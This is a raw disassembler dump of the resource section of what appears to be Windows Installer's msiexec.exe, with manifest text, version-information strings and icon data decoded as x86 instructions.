  4107e0:	xor    BYTE PTR ds:0x6e69572f,dh
  4107e6:	outs   dx,DWORD PTR fs:[esi]
  4107e8:	ja     0x41085d
  4107ea:	push   ebx
  4107eb:	gs je  0x410862
  4107ee:	imul   ebp,DWORD PTR [esi+0x67],0xd3e2273
  4107f5:	or     ah,BYTE PTR [eax]
  4107f7:	and    BYTE PTR [eax],ah
  4107f9:	and    BYTE PTR [eax],ah
  4107fb:	and    BYTE PTR [eax],ah
  4107fd:	and    BYTE PTR [eax],ah
  4107ff:	and    BYTE PTR [eax],ah
  410801:	and    BYTE PTR [esp+eiz*2],bh
  410804:	jo     0x41086f
  410806:	inc    ecx
  410807:	ja     0x41086a
  410809:	jb     0x410870
  41080b:	ds je  0x410880
  41080e:	jne    0x410875
  410810:	cmp    al,0x2f
  410812:	fs jo  0x41087e
  410815:	inc    ecx
  410816:	ja     0x410879
  410818:	jb     0x41087f
  41081a:	ds or  eax,0x2020200a
  410820:	and    BYTE PTR [eax],ah
  410822:	and    BYTE PTR [eax],ah
  410824:	and    BYTE PTR [edi+ebp*1],bh
  410827:	popa   
  410828:	jae    0x410897
  41082a:	jbe    0x41085f
  41082c:	cmp    dh,BYTE PTR [edi+0x69]
  41082f:	outs   dx,BYTE PTR ds:[esi]
  410830:	outs   dx,DWORD PTR fs:[esi]
  410832:	ja     0x4108a7
  410834:	push   ebx
  410835:	gs je  0x4108ac
  410838:	imul   ebp,DWORD PTR [esi+0x67],0xa0d3e73
  41083f:	and    BYTE PTR [eax],ah
  410841:	and    BYTE PTR [eax],ah
  410843:	cmp    al,0x2f
  410845:	popa   
  410846:	jae    0x4108b5
  410848:	jbe    0x41087d
  41084a:	cmp    ah,BYTE PTR [ecx+0x70]
  41084d:	jo     0x4108bb
  41084f:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  410856:	ds or  eax,0x3c0a0d0a
  41085c:	das    
  41085d:	popa   
  41085e:	jae    0x4108d3
  410860:	gs ins DWORD PTR es:[edi],dx
  410862:	bound  ebp,QWORD PTR [ecx+edi*2+0x3e]
  410866:	add    BYTE PTR [eax],al
  410868:	jo     0x41086d
  41086a:	xor    al,0x0
  41086c:	add    BYTE PTR [eax],al
  41086e:	push   esi
  41086f:	add    BYTE PTR [ebx+0x0],dl
  410872:	pop    edi
  410873:	add    BYTE PTR [esi+0x0],dl
  410876:	inc    ebp
  410877:	add    BYTE PTR [edx+0x0],dl
  41087a:	push   ebx
  41087b:	add    BYTE PTR [ecx+0x0],cl
  41087e:	dec    edi
  41087f:	add    BYTE PTR [esi+0x0],cl
  410882:	pop    edi
  410883:	add    BYTE PTR [ecx+0x0],cl
  410886:	dec    esi
  410887:	add    BYTE PTR [esi+0x0],al
  41088a:	dec    edi
  41088b:	add    BYTE PTR [eax],al
  41088d:	add    BYTE PTR [eax],al
  41088f:	add    BYTE PTR [ebp+0xfeef04],bh
  410895:	add    BYTE PTR [ecx],al
  410897:	add    BYTE PTR [eax],al
  410899:	add    BYTE PTR ds:0x400200,al
  41089f:	sub    BYTE PTR [eax],al
  4108a1:	add    BYTE PTR ds:0x400200,al
  4108a7:	sub    BYTE PTR [edi],bh
  4108a9:	add    BYTE PTR [eax],al
  4108ab:	add    BYTE PTR [eax],al
  4108ad:	add    BYTE PTR [eax],al
  4108af:	add    BYTE PTR [eax+eax*1],al
  4108b2:	add    al,0x0
  4108b4:	add    DWORD PTR [eax],eax
	...
  4108c2:	add    BYTE PTR [eax],al
  4108c4:	rol    BYTE PTR [edx],1
  4108c6:	add    BYTE PTR [eax],al
  4108c8:	add    DWORD PTR [eax],eax
  4108ca:	push   ebx
  4108cb:	add    BYTE PTR [eax+eax*1+0x72],dh
  4108cf:	add    BYTE PTR [ecx+0x0],ch
  4108d2:	outs   dx,BYTE PTR ds:[esi]
  4108d3:	add    BYTE PTR [edi+0x0],ah
  4108d6:	inc    esi
  4108d7:	add    BYTE PTR [ecx+0x0],ch
  4108da:	ins    BYTE PTR es:[edi],dx
  4108db:	add    BYTE PTR [ebp+0x0],ah
  4108de:	dec    ecx
  4108df:	add    BYTE PTR [esi+0x0],ch
  4108e2:	data16 add BYTE PTR [edi+0x0],ch
  4108e6:	add    BYTE PTR [eax],al
  4108e8:	lods   al,BYTE PTR ds:[esi]
  4108e9:	add    al,BYTE PTR [eax]
  4108eb:	add    BYTE PTR [ecx],al
  4108ed:	add    BYTE PTR [eax],dh
  4108ef:	add    BYTE PTR [eax+eax*1],dh
  4108f2:	xor    BYTE PTR [eax],al
  4108f4:	cmp    DWORD PTR [eax],eax
  4108f6:	xor    BYTE PTR [eax],al
  4108f8:	xor    al,0x0
  4108fa:	inc    edx
  4108fb:	add    BYTE PTR [eax],dh
  4108fd:	add    BYTE PTR [eax],al
  4108ff:	add    BYTE PTR [eax+eax*1+0x16],cl
  410903:	add    BYTE PTR [ecx],al
  410905:	add    BYTE PTR [ebx+0x0],al
  410908:	outs   dx,DWORD PTR ds:[esi]
  410909:	add    BYTE PTR [ebp+0x0],ch
  41090c:	jo     0x41090e
  41090e:	popa   
  41090f:	add    BYTE PTR [esi+0x0],ch
  410912:	jns    0x410914
  410914:	dec    esi
  410915:	add    BYTE PTR [ecx+0x0],ah
  410918:	ins    DWORD PTR es:[edi],dx
  410919:	add    BYTE PTR [ebp+0x0],ah
  41091c:	add    BYTE PTR [eax],al
  41091e:	add    BYTE PTR [eax],al
  410920:	dec    ebp
  410921:	add    BYTE PTR [ecx+0x0],ch
  410924:	arpl   WORD PTR [eax],ax
  410926:	jb     0x410928
  410928:	outs   dx,DWORD PTR ds:[esi]
  410929:	add    BYTE PTR [ebx+0x0],dh
  41092c:	outs   dx,DWORD PTR ds:[esi]
  41092d:	add    BYTE PTR [esi+0x0],ah
  410930:	je     0x410932
  410932:	and    BYTE PTR [eax],al
  410934:	inc    ebx
  410935:	add    BYTE PTR [edi+0x0],ch
  410938:	jb     0x41093a
  41093a:	jo     0x41093c
  41093c:	outs   dx,DWORD PTR ds:[esi]
  41093d:	add    BYTE PTR [edx+0x0],dh
  410940:	popa   
  410941:	add    BYTE PTR [eax+eax*1+0x69],dh
  410945:	add    BYTE PTR [edi+0x0],ch
  410948:	outs   dx,BYTE PTR ds:[esi]
  410949:	add    BYTE PTR [eax],al
  41094b:	add    BYTE PTR [esi+0x0],cl
  41094e:	adc    eax,DWORD PTR [eax]
  410950:	add    DWORD PTR [eax],eax
  410952:	inc    esi
  410953:	add    BYTE PTR [ecx+0x0],ch
  410956:	ins    BYTE PTR es:[edi],dx
  410957:	add    BYTE PTR [ebp+0x0],ah
  41095a:	inc    esp
  41095b:	add    BYTE PTR [ebp+0x0],ah
  41095e:	jae    0x410960
  410960:	arpl   WORD PTR [eax],ax
  410962:	jb     0x410964
  410964:	imul   eax,DWORD PTR [eax],0x740070
  41096a:	imul   eax,DWORD PTR [eax],0x6e006f
  410970:	add    BYTE PTR [eax],al
  410972:	add    BYTE PTR [eax],al
  410974:	push   edi
  410975:	add    BYTE PTR [ecx+0x0],ch
  410978:	outs   dx,BYTE PTR ds:[esi]
  410979:	add    BYTE PTR [eax+eax*1+0x6f],ah
  41097d:	add    BYTE PTR [edi+0x0],dh
  410980:	jae    0x410982
  410982:	scas   al,BYTE PTR es:[edi]
  410983:	add    BYTE PTR [eax],ah
  410985:	add    BYTE PTR [ecx+0x0],ch
  410988:	outs   dx,BYTE PTR ds:[esi]
  410989:	add    BYTE PTR [ebx+0x0],dh
  41098c:	je     0x41098e
  41098e:	popa   
  41098f:	add    BYTE PTR [eax+eax*1+0x6c],ch
  410993:	add    BYTE PTR [ebp+0x0],ah
  410996:	jb     0x410998
  410998:	add    BYTE PTR [eax],al
  41099a:	add    BYTE PTR [eax],al
  41099c:	ins    BYTE PTR es:[edi],dx
  41099d:	add    BYTE PTR [esi],ah
  41099f:	add    BYTE PTR [ecx],al
  4109a1:	add    BYTE PTR [esi+0x0],al
  4109a4:	imul   eax,DWORD PTR [eax],0x65006c
  4109aa:	push   esi
  4109ab:	add    BYTE PTR [ebp+0x0],ah
  4109ae:	jb     0x4109b0
  4109b0:	jae    0x4109b2
  4109b2:	imul   eax,DWORD PTR [eax],0x6e006f
  4109b8:	add    BYTE PTR [eax],al
  4109ba:	add    BYTE PTR [eax],al
  4109bc:	xor    eax,0x30002e00
  4109c1:	add    BYTE PTR [esi],ch
  4109c3:	add    BYTE PTR [ecx],dh
  4109c5:	add    BYTE PTR [eax],dh
  4109c7:	add    BYTE PTR [edx],dh
  4109c9:	add    BYTE PTR [eax+eax*1],dh
  4109cc:	xor    BYTE PTR [eax],al
  4109ce:	add    BYTE PTR cs:[ecx],dh
  4109d1:	add    BYTE PTR [esi],dh
  4109d3:	add    BYTE PTR [ebx],dh
  4109d5:	add    BYTE PTR [eax],bh
  4109d7:	add    BYTE PTR [esi],dh
  4109d9:	add    BYTE PTR [eax],ah
  4109db:	add    BYTE PTR [eax],ch
  4109dd:	add    BYTE PTR [eax+eax*1+0x68],dh
  4109e1:	add    BYTE PTR [ecx],dh
  4109e3:	add    BYTE PTR [edi+0x0],bl
  4109e6:	jae    0x4109e8
  4109e8:	je     0x4109ea
  4109ea:	xor    DWORD PTR [eax],eax
  4109ec:	add    BYTE PTR cs:[ecx],dh
  4109ef:	add    BYTE PTR ds:0x37003000,dh
  4109f5:	add    BYTE PTR [ecx],dh
  4109f7:	add    BYTE PTR [eax],dh
  4109f9:	add    BYTE PTR ds:0x35003100,ch
  4109ff:	add    BYTE PTR [ebx],dh
  410a01:	add    BYTE PTR [edi],dh
  410a03:	add    BYTE PTR [ecx],ch
  410a05:	add    BYTE PTR [eax],al
  410a07:	add    BYTE PTR [eax],dh
  410a09:	add    BYTE PTR [eax],cl
  410a0b:	add    BYTE PTR [ecx],al
  410a0d:	add    BYTE PTR [ecx+0x0],cl
  410a10:	outs   dx,BYTE PTR ds:[esi]
  410a11:	add    BYTE PTR [eax+eax*1+0x65],dh
  410a15:	add    BYTE PTR [edx+0x0],dh
  410a18:	outs   dx,BYTE PTR ds:[esi]
  410a19:	add    BYTE PTR [ecx+0x0],ah
  410a1c:	ins    BYTE PTR es:[edi],dx
  410a1d:	add    BYTE PTR [esi+0x0],cl
  410a20:	popa   
  410a21:	add    BYTE PTR [ebp+0x0],ch
  410a24:	add    BYTE PTR gs:[eax],al
  410a27:	add    BYTE PTR [ebp+0x0],ch
  410a2a:	jae    0x410a2c
  410a2c:	imul   eax,DWORD PTR [eax],0x780065
  410a32:	add    BYTE PTR gs:[ebx+0x0],ah
  410a36:	add    BYTE PTR [eax],al
  410a38:	add    BYTE PTR [eax],0x2e
  410a3b:	add    BYTE PTR [ecx],al
  410a3d:	add    BYTE PTR [eax+eax*1+0x65],cl
  410a41:	add    BYTE PTR [edi+0x0],ah
  410a44:	popa   
  410a45:	add    BYTE PTR [eax+eax*1+0x43],ch
  410a49:	add    BYTE PTR [edi+0x0],ch
  410a4c:	jo     0x410a4e
  410a4e:	jns    0x410a50
  410a50:	jb     0x410a52
  410a52:	imul   eax,DWORD PTR [eax],0x680067
  410a58:	je     0x410a5a
  410a5a:	add    BYTE PTR [eax],al
  410a5c:	test   eax,0x4d002000
  410a61:	add    BYTE PTR [ecx+0x0],ch
  410a64:	arpl   WORD PTR [eax],ax
  410a66:	jb     0x410a68
  410a68:	outs   dx,DWORD PTR ds:[esi]
  410a69:	add    BYTE PTR [ebx+0x0],dh
  410a6c:	outs   dx,DWORD PTR ds:[esi]
  410a6d:	add    BYTE PTR [esi+0x0],ah
  410a70:	je     0x410a72
  410a72:	and    BYTE PTR [eax],al
  410a74:	inc    ebx
  410a75:	add    BYTE PTR [edi+0x0],ch
  410a78:	jb     0x410a7a
  410a7a:	jo     0x410a7c
  410a7c:	outs   dx,DWORD PTR ds:[esi]
  410a7d:	add    BYTE PTR [edx+0x0],dh
  410a80:	popa   
  410a81:	add    BYTE PTR [eax+eax*1+0x69],dh
  410a85:	add    BYTE PTR [edi+0x0],ch
  410a88:	outs   dx,BYTE PTR ds:[esi]
  410a89:	add    BYTE PTR [esi],ch
  410a8b:	add    BYTE PTR [eax],ah
  410a8d:	add    BYTE PTR [ecx+0x0],al
  410a90:	ins    BYTE PTR es:[edi],dx
  410a91:	add    BYTE PTR [eax+eax*1+0x20],ch
  410a95:	add    BYTE PTR [edx+0x0],dh
  410a98:	imul   eax,DWORD PTR [eax],0x680067
  410a9e:	je     0x410aa0
  410aa0:	jae    0x410aa2
  410aa2:	and    BYTE PTR [eax],al
  410aa4:	jb     0x410aa6
  410aa6:	add    BYTE PTR gs:[ebx+0x0],dh
  410aaa:	add    BYTE PTR gs:[edx+0x0],dh
  410aae:	jbe    0x410ab0
  410ab0:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  410ab5:	add    BYTE PTR [eax],al
  410ab7:	add    BYTE PTR [eax+0x0],al
  410aba:	or     al,0x0
  410abc:	add    DWORD PTR [eax],eax
  410abe:	dec    edi
  410abf:	add    BYTE PTR [edx+0x0],dh
  410ac2:	imul   eax,DWORD PTR [eax],0x690067
  410ac8:	outs   dx,BYTE PTR ds:[esi]
  410ac9:	add    BYTE PTR [ecx+0x0],ah
  410acc:	ins    BYTE PTR es:[edi],dx
  410acd:	add    BYTE PTR [esi+0x0],al
  410ad0:	imul   eax,DWORD PTR [eax],0x65006c
  410ad6:	outs   dx,BYTE PTR ds:[esi]
  410ad7:	add    BYTE PTR [ecx+0x0],ah
  410ada:	ins    DWORD PTR es:[edi],dx
  410adb:	add    BYTE PTR [ebp+0x0],ah
  410ade:	add    BYTE PTR [eax],al
  410ae0:	ins    DWORD PTR es:[edi],dx
  410ae1:	add    BYTE PTR [ebx+0x0],dh
  410ae4:	imul   eax,DWORD PTR [eax],0x780065
  410aea:	add    BYTE PTR gs:[ebx+0x0],ah
  410aee:	add    BYTE PTR cs:[ebp+0x0],ah
  410af2:	js     0x410af4
  410af4:	add    BYTE PTR gs:[eax],al
  410af7:	add    BYTE PTR [eax+0x0],bl
  410afa:	sbb    al,0x0
  410afc:	add    DWORD PTR [eax],eax
  410afe:	push   eax
  410aff:	add    BYTE PTR [edx+0x0],dh
  410b02:	outs   dx,DWORD PTR ds:[esi]
  410b03:	add    BYTE PTR [eax+eax*1+0x75],ah
  410b07:	add    BYTE PTR [ebx+0x0],ah
  410b0a:	je     0x410b0c
  410b0c:	dec    esi
  410b0d:	add    BYTE PTR [ecx+0x0],ah
  410b10:	ins    DWORD PTR es:[edi],dx
  410b11:	add    BYTE PTR [ebp+0x0],ah
  410b14:	add    BYTE PTR [eax],al
  410b16:	add    BYTE PTR [eax],al
  410b18:	push   edi
  410b19:	add    BYTE PTR [ecx+0x0],ch
  410b1c:	outs   dx,BYTE PTR ds:[esi]
  410b1d:	add    BYTE PTR [eax+eax*1+0x6f],ah
  410b21:	add    BYTE PTR [edi+0x0],dh
  410b24:	jae    0x410b26
  410b26:	and    BYTE PTR [eax],al
  410b28:	dec    ecx
  410b29:	add    BYTE PTR [esi+0x0],ch
  410b2c:	jae    0x410b2e
  410b2e:	je     0x410b30
  410b30:	popa   
  410b31:	add    BYTE PTR [eax+eax*1+0x6c],ch
  410b35:	add    BYTE PTR [ebp+0x0],ah
  410b38:	jb     0x410b3a
  410b3a:	and    BYTE PTR [eax],al
  410b3c:	sub    eax,0x55002000
  410b41:	add    BYTE PTR [esi+0x0],ch
  410b44:	imul   eax,DWORD PTR [eax],0x6f0063
  410b4a:	add    BYTE PTR fs:[ebp+0x0],ah
  410b4e:	add    BYTE PTR [eax],al
  410b50:	inc    esp
  410b51:	add    BYTE PTR [eax],dl
  410b53:	add    BYTE PTR [ecx],al
  410b55:	add    BYTE PTR [eax+0x0],dl
  410b58:	jb     0x410b5a
  410b5a:	outs   dx,DWORD PTR ds:[esi]
  410b5b:	add    BYTE PTR [eax+eax*1+0x75],ah
  410b5f:	add    BYTE PTR [ebx+0x0],ah
  410b62:	je     0x410b64
  410b64:	push   esi
  410b65:	add    BYTE PTR [ebp+0x0],ah
  410b68:	jb     0x410b6a
  410b6a:	jae    0x410b6c
  410b6c:	imul   eax,DWORD PTR [eax],0x6e006f
  410b72:	add    BYTE PTR [eax],al
  410b74:	xor    eax,0x30002e00
  410b79:	add    BYTE PTR [esi],ch
  410b7b:	add    BYTE PTR [ecx],dh
  410b7d:	add    BYTE PTR [eax],dh
  410b7f:	add    BYTE PTR [edx],dh
  410b81:	add    BYTE PTR [eax+eax*1],dh
  410b84:	xor    BYTE PTR [eax],al
  410b86:	add    BYTE PTR cs:[ecx],dh
  410b89:	add    BYTE PTR [esi],dh
  410b8b:	add    BYTE PTR [ebx],dh
  410b8d:	add    BYTE PTR [eax],bh
  410b8f:	add    BYTE PTR [esi],dh
  410b91:	add    BYTE PTR [eax],al
  410b93:	add    BYTE PTR [eax+eax*1+0x0],al
  410b97:	add    BYTE PTR [ecx],al
  410b99:	add    BYTE PTR [esi+0x0],dl
  410b9c:	popa   
  410b9d:	add    BYTE PTR [edx+0x0],dh
  410ba0:	inc    esi
  410ba1:	add    BYTE PTR [ecx+0x0],ch
  410ba4:	ins    BYTE PTR es:[edi],dx
  410ba5:	add    BYTE PTR [ebp+0x0],ah
  410ba8:	dec    ecx
  410ba9:	add    BYTE PTR [esi+0x0],ch
  410bac:	data16 add BYTE PTR [edi+0x0],ch
  410bb0:	add    BYTE PTR [eax],al
  410bb2:	add    BYTE PTR [eax],al
  410bb4:	and    al,0x0
  410bb6:	add    al,0x0
  410bb8:	add    BYTE PTR [eax],al
  410bba:	push   esp
  410bbb:	add    BYTE PTR [edx+0x0],dh
  410bbe:	popa   
  410bbf:	add    BYTE PTR [esi+0x0],ch
  410bc2:	jae    0x410bc4
  410bc4:	ins    BYTE PTR es:[edi],dx
  410bc5:	add    BYTE PTR [ecx+0x0],ah
  410bc8:	je     0x410bca
  410bca:	imul   eax,DWORD PTR [eax],0x6e006f
  410bd0:	add    BYTE PTR [eax],al
  410bd2:	add    BYTE PTR [eax],al
  410bd4:	or     DWORD PTR [eax+esi*4],eax
  410bd7:	add    al,0x28
  410bd9:	add    BYTE PTR [eax],al
  410bdb:	add    BYTE PTR [eax],dl
  410bdd:	add    BYTE PTR [eax],al
  410bdf:	add    BYTE PTR [eax],ah
  410be1:	add    BYTE PTR [eax],al
  410be3:	add    BYTE PTR [ecx],al
  410be5:	add    BYTE PTR [eax+eax*1],al
  410be8:	add    BYTE PTR [eax],al
  410bea:	add    BYTE PTR [eax],al
  410bec:	rol    BYTE PTR [eax],0x0
	...
  410c03:	add    BYTE PTR [eax],al
  410c05:	add    BYTE PTR [eax],0x0
  410c08:	add    BYTE PTR [eax],0x0
  410c0b:	add    BYTE PTR [eax+0x80],al
  410c11:	add    BYTE PTR [eax-0x7f800000],al
  410c17:	add    BYTE PTR [eax-0x7fff8000],al
  410c1d:	add    BYTE PTR [eax-0x3f3f4000],0x0
  410c24:	add    bh,bh
  410c26:	add    BYTE PTR [eax],al
  410c28:	inc    DWORD PTR [eax]
  410c2a:	add    BYTE PTR [eax],al
  410c2c:	(bad)  
  410c2d:	inc    DWORD PTR [eax]
  410c2f:	add    BYTE PTR [eax],al
  410c31:	add    bh,bh
  410c33:	add    BYTE PTR [eax],al
  410c35:	(bad)  
  410c36:	inc    DWORD PTR [eax]
  410c38:	inc    DWORD PTR [eax]
  410c3a:	inc    DWORD PTR [eax]
  410c3c:	(bad)  
  410c3d:	(bad)  
  410c3e:	inc    DWORD PTR [eax]
  410c40:	add    BYTE PTR [eax],al
  410c42:	add    BYTE PTR [edi],al
  410c44:	jo     0x410c46
  410c46:	add    BYTE PTR [eax],al
  410c48:	pop    es
  410c49:	add    BYTE PTR [eax],0xff
  410c4c:	lea    edx,[eax-0x7ff90000]
  410c52:	ja     0x410be3
  410c54:	mov    DWORD PTR [eax-0x7ff90000],ecx
  410c5a:	js     0x410be4
  410c5c:	or     DWORD PTR [ebx-0x7ff90000],edi
  410c62:	js     0x410bef
  410c64:	add    BYTE PTR [eax-0xff90000],cl
  410c6a:	jnp    0x410bf7
  410c6c:	fisttp WORD PTR [eax-0xff90000]
  410c72:	xchg   DWORD PTR [ebx-0x7f770721],edi
  410c78:	pop    es
  410c79:	lock mov BYTE PTR [ebp-0x28],bh
  410c7d:	pop    es
  410c7e:	ja     0x410c00
  410c80:	pop    es
  410c81:	jo     0x410c0b
  410c83:	ja     0x410cfc
  410c85:	ja     0x410cfe
  410c87:	cmp    BYTE PTR [edi-0x9],0x88
  410c8b:	js     0x410c15
  410c8d:	mov    BYTE PTR [eax+0x78770770],cl
  410c93:	jb     0x410cb7
  410c95:	and    ch,BYTE PTR [edi]
  410c97:	jo     0x410c99
  410c99:	pop    es
  410c9a:	push   DWORD PTR [edx+0x22]
  410c9d:	and    ch,BYTE PTR [edi]
  410c9f:	jo     0x410ca1
  410ca1:	add    BYTE PTR [edi+0x72],dh
  410ca4:	and    ah,BYTE PTR [edx]
  410ca6:	das    
  410ca7:	jo     0x410ca9
  410ca9:	add    BYTE PTR [eax],al
  410cab:	jb     0x410c4f
  410cad:	and    ch,BYTE PTR [edi]
  410caf:	jo     0x410cb1
  410cb1:	add    BYTE PTR [eax],al
  410cb3:	jb     0x410c5f
  410cb5:	stos   BYTE PTR es:[edi],al
  410cb6:	scas   eax,DWORD PTR es:[edi]
  410cb7:	jo     0x410cb9
  410cb9:	add    BYTE PTR [eax],al
  410cbb:	jg     0x410cbc
  410cbd:	(bad)  
  410cbe:	push   DWORD PTR [eax-0x74]
  410cc1:	pop    ds
  410cc2:	add    BYTE PTR [eax],al
  410cc4:	or     BYTE PTR [edi],0x0
  410cc7:	add    BYTE PTR [eax-0x7ffffff9],al
  410ccd:	pop    es
  410cce:	add    BYTE PTR [eax],al
  410cd0:	add    BYTE PTR [edi],0x0
  410cd3:	add    BYTE PTR [eax-0x7fffffff],al
  410cd9:	add    BYTE PTR [eax],al
  410cdb:	add    BYTE PTR [eax-0x80000000],al
  410ce1:	add    BYTE PTR [eax],al
  410ce3:	add    BYTE PTR [eax],al
  410ce5:	add    BYTE PTR [eax],al
  410ce7:	add    BYTE PTR [eax-0x20000000],al
  410ced:	add    BYTE PTR [eax],al
  410cef:	add    al,dh
  410cf1:	add    BYTE PTR [eax],al
  410cf3:	add    ah,bh
  410cf5:	add    BYTE PTR [eax],al
  410cf7:	add    ah,bh
  410cf9:	add    BYTE PTR [eax],al
  410cfb:	add    ah,bh
  410cfd:	add    BYTE PTR [eax],al
  410cff:	add    BYTE PTR [eax],ch
  410d01:	add    BYTE PTR [eax],al
  410d03:	add    BYTE PTR [eax],dl
  410d05:	add    BYTE PTR [eax],al
  410d07:	add    BYTE PTR [eax],ah
  410d09:	add    BYTE PTR [eax],al
  410d0b:	add    BYTE PTR [ecx],al
  410d0d:	add    BYTE PTR [eax],cl
  410d0f:	add    BYTE PTR [eax],al
  410d11:	add    BYTE PTR [eax],al
  410d13:	add    BYTE PTR [eax+0x1],al
	...
  410d2a:	add    BYTE PTR [eax],al
  410d2c:	add    BYTE PTR [eax],0x0
  410d2f:	add    BYTE PTR [eax],al
  410d31:	add    BYTE PTR [eax],0x0
  410d34:	add    BYTE PTR [eax+0x0],0x80
  410d3b:	add    BYTE PTR [eax+0x8000],al
  410d41:	add    BYTE PTR [eax-0x3f3f4000],0x0
  410d48:	rcr    ah,0xc0
  410d4b:	add    BYTE PTR [esi+0x400f0ca],ah
  410d51:	add    al,0x4
  410d53:	add    BYTE PTR [eax],cl
  410d55:	or     BYTE PTR [eax],cl
  410d57:	add    BYTE PTR [esp+ecx*1],cl
  410d5a:	or     al,0x0
  410d5c:	adc    DWORD PTR [ecx],edx
  410d5e:	adc    DWORD PTR [eax],eax
  410d60:	push   ss
  410d61:	push   ss
  410d62:	push   ss
  410d63:	add    BYTE PTR [esp+ebx*1],bl
  410d66:	sbb    al,0x0
  410d68:	and    ah,BYTE PTR [edx]
  410d6a:	and    al,BYTE PTR [eax]
  410d6c:	sub    DWORD PTR [ecx],ebp
  410d6e:	sub    DWORD PTR [eax],eax
  410d70:	push   ebp
  410d71:	push   ebp
  410d72:	push   ebp
  410d73:	add    BYTE PTR [ebp+0x4d],cl
  410d76:	dec    ebp
  410d77:	add    BYTE PTR [edx+0x42],al
  410d7a:	inc    edx
  410d7b:	add    BYTE PTR [ecx],bh
  410d7d:	cmp    DWORD PTR [ecx],edi
  410d7f:	add    bh,bh
  410d81:	jl     0x410d03
  410d83:	add    bh,bh
  410d85:	push   eax
  410d86:	push   eax
  410d87:	add    dh,dl
  410d89:	add    BYTE PTR [ebx-0x133400],dl
  410d8f:	add    bh,ch
  410d91:	(bad)  
  410d92:	mov    BYTE PTR [eax],0xe7
  410d95:	out    0xd6,eax
  410d97:	add    BYTE PTR [ebp+0x330090a9],ch
  410d9d:	add    BYTE PTR [eax],al
  410d9f:	add    BYTE PTR [esi+0x0],ah
  410da2:	add    BYTE PTR [eax],al
  410da4:	cdq    
  410da5:	add    BYTE PTR [eax],al
  410da7:	add    ah,cl
  410da9:	add    BYTE PTR [eax],al
  410dab:	add    BYTE PTR [eax],al
  410dad:	xor    eax,DWORD PTR [eax]
  410daf:	add    BYTE PTR [ebx],dh
  410db1:	xor    eax,DWORD PTR [eax]
  410db3:	add    BYTE PTR [esi+0x33],ah
  410db6:	add    BYTE PTR [eax],al
  410db8:	cdq    
  410db9:	xor    eax,DWORD PTR [eax]
  410dbb:	add    ah,cl
  410dbd:	xor    eax,DWORD PTR [eax]
  410dbf:	add    bh,bh
  410dc1:	xor    eax,DWORD PTR [eax]
  410dc3:	add    BYTE PTR [eax],al
  410dc5:	data16 add BYTE PTR [eax],al
  410dc8:	xor    esp,DWORD PTR [esi+0x0]
  410dcb:	add    BYTE PTR [esi+0x66],ah
  410dce:	add    BYTE PTR [eax],al
  410dd0:	cdq    
  410dd1:	data16 add BYTE PTR [eax],al
  410dd4:	int3   
  410dd5:	data16 add BYTE PTR [eax],al
  410dd8:	jmp    DWORD PTR [esi+0x0]
  410ddb:	add    BYTE PTR [eax],al
  410ddd:	cdq    
  410dde:	add    BYTE PTR [eax],al
  410de0:	xor    ebx,DWORD PTR [ecx-0x669a0000]
  410de6:	add    BYTE PTR [eax],al
  410de8:	cdq    
  410de9:	cdq    
  410dea:	add    BYTE PTR [eax],al
  410dec:	int3   
  410ded:	cdq    
  410dee:	add    BYTE PTR [eax],al
  410df0:	call   FWORD PTR [ecx-0x34000000]
  410df6:	add    BYTE PTR [eax],al
  410df8:	xor    ecx,esp
  410dfa:	add    BYTE PTR [eax],al
  410dfc:	data16 int3 
  410dfe:	add    BYTE PTR [eax],al
  410e00:	cdq    
  410e01:	int3   
  410e02:	add    BYTE PTR [eax],al
  410e04:	int3   
  410e05:	int3   
  410e06:	add    BYTE PTR [eax],al
  410e08:	dec    esp
  410e0a:	add    BYTE PTR [eax],al
  410e0c:	inc    WORD PTR [eax]
  410e0f:	add    BYTE PTR [ecx-0x33ffff01],bl
  410e15:	inc    DWORD PTR [eax]
  410e17:	add    BYTE PTR [eax],al
  410e19:	add    BYTE PTR [ebx],dh
  410e1b:	add    BYTE PTR [ebx],dh
  410e1d:	add    BYTE PTR [ebx],dh
  410e1f:	add    BYTE PTR [esi+0x0],ah
  410e22:	xor    eax,DWORD PTR [eax]
  410e24:	cdq    
  410e25:	add    BYTE PTR [ebx],dh
  410e27:	add    ah,cl
  410e29:	add    BYTE PTR [ebx],dh
  410e2b:	add    bh,bh
  410e2d:	add    BYTE PTR [ebx],dh
  410e2f:	add    BYTE PTR [eax],al
  410e31:	xor    esi,DWORD PTR [ebx]
  410e33:	add    BYTE PTR [ebx],dh
  410e35:	xor    esi,DWORD PTR [ebx]
  410e37:	add    BYTE PTR [esi+0x33],ah
  410e3a:	xor    eax,DWORD PTR [eax]
  410e3c:	cdq    
  410e3d:	xor    esi,DWORD PTR [ebx]
  410e3f:	add    ah,cl
  410e41:	xor    esi,DWORD PTR [ebx]
  410e43:	add    bh,bh
  410e45:	xor    esi,DWORD PTR [ebx]
  410e47:	add    BYTE PTR [eax],al
  410e49:	xor    ax,WORD PTR [eax]
  410e4c:	xor    esp,DWORD PTR [esi+0x33]
  410e4f:	add    BYTE PTR [esi+0x66],ah
  410e52:	xor    eax,DWORD PTR [eax]
  410e54:	cdq    
  410e55:	xor    ax,WORD PTR [eax]
  410e58:	int3   
  410e59:	xor    ax,WORD PTR [eax]
  410e5c:	jmp    DWORD PTR [esi+0x33]
  410e5f:	add    BYTE PTR [eax],al
  410e61:	cdq    
  410e62:	xor    eax,DWORD PTR [eax]
  410e64:	xor    ebx,DWORD PTR [ecx-0x6699ffcd]
  410e6a:	xor    eax,DWORD PTR [eax]
  410e6c:	cdq    
  410e6d:	cdq    
  410e6e:	xor    eax,DWORD PTR [eax]
  410e70:	int3   
  410e71:	cdq    
  410e72:	xor    eax,DWORD PTR [eax]
  410e74:	call   FWORD PTR [ecx-0x33ffffcd]
  410e7a:	xor    eax,DWORD PTR [eax]
  410e7c:	xor    ecx,esp
  410e7e:	xor    eax,DWORD PTR [eax]
  410e80:	data16 int3 
  410e82:	xor    eax,DWORD PTR [eax]
  410e84:	cdq    
  410e85:	int3   
  410e86:	xor    eax,DWORD PTR [eax]
  410e88:	int3   
  410e89:	int3   
  410e8a:	xor    eax,DWORD PTR [eax]
  410e8c:	dec    esp
  410e8e:	xor    eax,DWORD PTR [eax]
  410e90:	xor    edi,edi
  410e92:	xor    eax,DWORD PTR [eax]
  410e94:	push   WORD PTR [ebx]
  410e97:	add    BYTE PTR [ecx-0x33ffcc01],bl
  410e9d:	push   DWORD PTR [ebx]
  410e9f:	add    bh,bh
  410ea1:	push   DWORD PTR [ebx]
  410ea3:	add    BYTE PTR [eax],al
